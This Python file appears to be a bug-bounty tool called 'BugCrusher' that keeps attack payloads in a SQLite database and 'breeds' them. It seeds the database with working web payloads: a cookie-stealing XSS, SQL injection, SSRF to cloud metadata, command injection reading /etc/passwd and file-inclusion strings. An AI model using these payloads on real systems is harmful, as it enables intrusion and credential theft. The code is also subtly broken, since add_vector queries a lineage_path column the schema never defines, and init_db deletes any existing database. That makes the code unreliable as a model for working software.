#!/usr/bin/env python3
"""
BugCrusher — Vector Strike: Attack Vector Database
Production-grade SQLite vector storage with full schema.
"""

import sqlite3
import json
import uuid
import hashlib
import os
from datetime import datetime
from typing import Optional

DB_PATH = "/home/workspace/BugCrusher/vector_db.sqlite"

SCHEMA = """
CREATE TABLE IF NOT EXISTS vectors (
    id TEXT PRIMARY KEY,
    payload TEXT NOT NULL,
    category TEXT NOT NULL,
    subcategory TEXT,
    vector_type TEXT NOT NULL DEFAULT 'payload',
    encoding TEXT DEFAULT 'plain',
    target TEXT,
    cvss REAL,
    cwe_id TEXT,
    working INTEGER DEFAULT 0,
    fitness_score REAL DEFAULT 0.5,
    success_count INTEGER DEFAULT 0,
    failure_count INTEGER DEFAULT 0,
    last_used TEXT,
    discovered_at TEXT NOT NULL,
    source TEXT DEFAULT 'manual',
    program_scope TEXT,
    notes TEXT,
    hash TEXT UNIQUE,
    parent_id TEXT,
    generation INTEGER DEFAULT 1,
    mutation_type TEXT,
    tags TEXT,
    created_by TEXT DEFAULT 'manual'
);

CREATE TABLE IF NOT EXISTS breeding_log (
    id TEXT PRIMARY KEY,
    parent_id TEXT NOT NULL,
    child_id TEXT NOT NULL,
    strategy TEXT NOT NULL,
    bred_at TEXT NOT NULL,
    fitness_delta REAL
);

CREATE TABLE IF NOT EXISTS hunt_sessions (
    id TEXT PRIMARY KEY,
    target TEXT NOT NULL,
    started_at TEXT NOT NULL,
    ended_at TEXT,
    vectors_tested INTEGER DEFAULT 0,
    findings_count INTEGER DEFAULT 0,
    status TEXT DEFAULT 'active',
    config TEXT,
    agent_id TEXT
);

CREATE TABLE IF NOT EXISTS findings (
    id TEXT PRIMARY KEY,
    session_id TEXT,
    vector_id TEXT,
    vulnerability_type TEXT NOT NULL,
    severity TEXT NOT NULL,
    cvss_score REAL,
    target_url TEXT,
    target_param TEXT,
    PoC_request TEXT,
    PoC_response TEXT,
    confirmed INTEGER DEFAULT 0,
    dup_of TEXT,
    reported_at TEXT,
    bounty_amount REAL,
    program TEXT,
    notes TEXT
);

CREATE TABLE IF NOT EXISTS worm_signatures (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    family TEXT,
    pattern_type TEXT NOT NULL,
    pattern TEXT NOT NULL,
    severity TEXT NOT NULL,
    confidence REAL DEFAULT 0.5,
    action_taken TEXT,
    detected_at TEXT NOT NULL,
    raw_indicator TEXT,
    mitigation TEXT,
    references_info TEXT
);

CREATE TABLE IF NOT EXISTS target_programs (
    id TEXT PRIMARY KEY,
    program_name TEXT NOT NULL,
    platform TEXT NOT NULL,
    scope TEXT NOT NULL,
    bugcrowd_id TEXT,
    hackerone_id TEXT,
    asset_inventory TEXT,
    added_at TEXT NOT NULL,
    last_hunted TEXT,
    total_findings INTEGER DEFAULT 0,
    critical_hits INTEGER DEFAULT 0,
    high_hits INTEGER DEFAULT 0,
    roi_score REAL DEFAULT 0.0
);

CREATE TABLE IF NOT EXISTS evolution_analytics (
    id TEXT PRIMARY KEY,
    category TEXT NOT NULL,
    generation INTEGER NOT NULL,
    population_size INTEGER,
    avg_fitness REAL,
    top_fitness REAL,
    mutation_rate REAL,
    crossover_rate REAL,
    best_vector_id TEXT,
    timestamp TEXT NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_vectors_category ON vectors(category);
CREATE INDEX IF NOT EXISTS idx_vectors_fitness ON vectors(fitness_score DESC);
CREATE INDEX IF NOT EXISTS idx_vectors_hash ON vectors(hash);
CREATE INDEX IF NOT EXISTS idx_findings_severity ON findings(severity);
CREATE INDEX IF NOT EXISTS idx_worm_pattern ON worm_signatures(pattern);
CREATE INDEX IF NOT EXISTS idx_programs_platform ON target_programs(platform);
"""

SEED_VECTORS = [
    ("XSS", "reflected", "payload", '<img src=x onerror=alert(document.domain)>', 0.7, "WSTG-INPV-01", "CRITICAL"),
    ("XSS", "stored", "payload", '<svg onload=fetch(`//${location.host}/?c=${document.cookie}`)>', 0.8, "WSTG-INPV-01", "CRITICAL"),
    ("XSS", "DOM", "payload", "javascript:eval(atob('YWxlcnQoMSk='))", 0.6, "WSTG-CLIENT-01", "HIGH"),
    ("SQLi", "union", "payload", "1' UNION SELECT NULL,NULL,NULL--", 0.7, "WSTG-INPV-05", "CRITICAL"),
    ("SQLi", "boolean-blind", "payload", "1' AND 1=1--", 0.8, "WSTG-INPV-05", "HIGH"),
    ("SQLi", "time-blind", "payload", "1'; SELECT PG_SLEEP(5)--", 0.75, "WSTG-INPV-05", "HIGH"),
    ("SSRF", "metadata", "payload", "http://169.254.169.254/latest/meta-data/", 0.9, "WSTG-INPV-10", "CRITICAL"),
    ("SSRF", "internal-scan", "payload", "http://localhost:80/admin", 0.85, "WSTG-INPV-10", "HIGH"),
    ("IDOR", "direct-ref", "payload", "/api/users/1/profile", 0.7, "WSTG-AUTHZ-01", "HIGH"),
    ("IDOR", "encoded-id", "payload", "/api/orders/%32%35/details", 0.65, "WSTG-AUTHZ-01", "MEDIUM"),
    ("CMDi", "unix-pipe", "payload", "| cat /etc/passwd", 0.8, "WSTG-INPV-12", "CRITICAL"),
    ("CMDi", "semicolon", "payload", "; whoami;", 0.75, "WSTG-INPV-12", "HIGH"),
    ("SSTI", "jinja2", "payload", "{{7*7}}", 0.8, "WSTG-INPV-08", "CRITICAL"),
    ("SSTI", "erb", "payload", "<%= 7*7 %>", 0.7, "WSTG-INPV-08", "HIGH"),
    ("OpenRedirect", "double-encode", "payload", "https://google.com%%32%35", 0.6, "WSTG-INPV-04", "MEDIUM"),
    ("LFI", "null-byte", "payload", "../../../etc/passwd%00.jpg", 0.8, "WSTG-INPV-01", "HIGH"),
    ("RFI", "wrapper", "payload", "php://filter/read=convert.base64-encode/resource=index.php", 0.75, "WSTG-INPV-02", "HIGH"),
]

def init_db():
    if os.path.exists(DB_PATH):
        os.remove(DB_PATH)
    conn = sqlite3.connect(DB_PATH)
    conn.executescript(SCHEMA)
    
    for cat, subcat, vtype, payload, fitness, ref, sev in SEED_VECTORS:
        vec_id = str(uuid.uuid4())[:12]
        hash_val = hashlib.sha256(payload.encode()).hexdigest()[:16]
        conn.execute("""
            INSERT INTO vectors 
            (id, payload, category, subcategory, vector_type, fitness_score, source, notes, hash, discovered_at, cvss, tags)
            VALUES (?, ?, ?, ?, ?, ?, 'seed', ?, ?, ?, ?, ?)
        """, (vec_id, payload, cat, subcat, vtype, fitness, ref, hash_val, datetime.now().isoformat(), 
              9.0 if sev == "CRITICAL" else 7.0 if sev == "HIGH" else 4.0, sev))
    
    conn.commit()
    conn.close()
    print(f"[*] Vector DB initialized at {DB_PATH}")

def add_vector(payload, category, subcategory="", vector_type="payload", 
               source="manual", program_scope="", notes="", parent_id=None,
               mutation_type=None, tags=None):
    conn = sqlite3.connect(DB_PATH)
    vec_id = str(uuid.uuid4())[:12]
    hash_val = hashlib.sha256(payload.encode()).hexdigest()[:16]
    
    lineage_path = ""
    generation = 1
    if parent_id:
        cur = conn.execute("SELECT generation, lineage_path FROM vectors WHERE id=?", (parent_id,))
        row = cur.fetchone()
        if row:
            generation = row[0] + 1
            lineage_path = f"{row[1]}/{parent_id}" if row[1] else parent_id
    
    conn.execute("""
        INSERT INTO vectors 
        (id, payload, category, subcategory, vector_type, source, program_scope, notes, hash, parent_id, generation, mutation_type, tags, discovered_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (vec_id, payload, category, subcategory, vector_type, source, program_scope, notes, hash_val, parent_id or "", generation, mutation_type or "", json.dumps(tags) if tags else "", datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return vec_id

def get_vectors(category=None, min_fitness=0.0, limit=50):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    query = "SELECT * FROM vectors WHERE fitness_score >= ?"
    params = [min_fitness]
    if category:
        query += " AND category = ?"
        params.append(category)
    query += " ORDER BY fitness_score DESC LIMIT ?"
    params.append(limit)
    rows = conn.execute(query, params).fetchall()
    conn.close()
    return [dict(r) for r in rows]

def record_success(vector_id):
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        UPDATE vectors SET 
            success_count = success_count + 1,
            working = 1,
            fitness_score = MIN(1.0, fitness_score + 0.05),
            last_used = ?
        WHERE id = ?
    """, (datetime.now().isoformat(), vector_id))
    conn.commit()
    conn.close()

def record_failure(vector_id):
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        UPDATE vectors SET 
            failure_count = failure_count + 1,
            fitness_score = MAX(0.0, fitness_score - 0.02),
            last_used = ?
        WHERE id = ?
    """, (datetime.now().isoformat(), vector_id))
    conn.commit()
    conn.close()

def log_breeding(parent_id, child_id, strategy, fitness_delta):
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        INSERT INTO breeding_log (id, parent_id, child_id, strategy, bred_at, fitness_delta)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (str(uuid.uuid4())[:12], parent_id, child_id, strategy, datetime.now().isoformat(), fitness_delta))
    conn.commit()
    conn.close()

def add_worm_signature(name, family, pattern_type, pattern, severity, confidence, raw_indicator="", mitigation=""):
    conn = sqlite3.connect(DB_PATH)
    sig_id = str(uuid.uuid4())[:12]
    conn.execute("""
        INSERT INTO worm_signatures 
        (id, name, family, pattern_type, pattern, severity, confidence, raw_indicator, mitigation, detected_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (sig_id, name, family, pattern_type, pattern, severity, confidence, raw_indicator, mitigation, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return sig_id

def add_target_program(program_name, platform, scope, bugcrowd_id="", hackerone_id=""):
    conn = sqlite3.connect(DB_PATH)
    prog_id = str(uuid.uuid4())[:12]
    conn.execute("""
        INSERT INTO target_programs 
        (id, program_name, platform, scope, bugcrowd_id, hackerone_id, added_at)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (prog_id, program_name, platform, scope, bugcrowd_id, hackerone_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return prog_id

def get_analytics():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    
    stats = {}
    stats['total_vectors'] = conn.execute("SELECT COUNT(*) FROM vectors").fetchone()[0]
    stats['total_findings'] = conn.execute("SELECT COUNT(*) FROM findings").fetchone()[0]
    stats['critical_findings'] = conn.execute("SELECT COUNT(*) FROM findings WHERE severity='CRITICAL'").fetchone()[0]
    stats['worm_signatures'] = conn.execute("SELECT COUNT(*) FROM worm_signatures").fetchone()[0]
    stats['active_programs'] = conn.execute("SELECT COUNT(*) FROM target_programs").fetchone()[0]
    
    top_vectors = conn.execute("""
        SELECT payload, category, fitness_score, success_count FROM vectors 
        ORDER BY fitness_score DESC LIMIT 5
    """).fetchall()
    stats['top_vectors'] = [dict(r) for r in top_vectors]
    
    cat_dist = conn.execute("""
        SELECT category, COUNT(*) as cnt, MAX(fitness_score) as top_fit 
        FROM vectors GROUP BY category
    """).fetchall()
    stats['category_dist'] = [dict(r) for r in cat_dist]
    
    conn.close()
    return stats

if __name__ == "__main__":
    init_db()
    stats = get_analytics()
    print(f"[*] Total vectors: {stats['total_vectors']}")
    print(f"[*] Active programs: {stats['active_programs']}")
    print(f"[*] Worm signatures: {stats['worm_signatures']}")
    print("\n[*] Top vectors by fitness:")
    for v in stats['top_vectors']:
        print(f"  [{v['fitness_score']:.2f}] {v['category']} ({v['success_count']} hits): {v['payload'][:45]}...")
    print("\n[*] Category distribution:")
    for c in stats['category_dist']:
        print(f"  {c['category']}: {c['cnt']} vectors (top fitness: {c['top_fit']:.2f})")
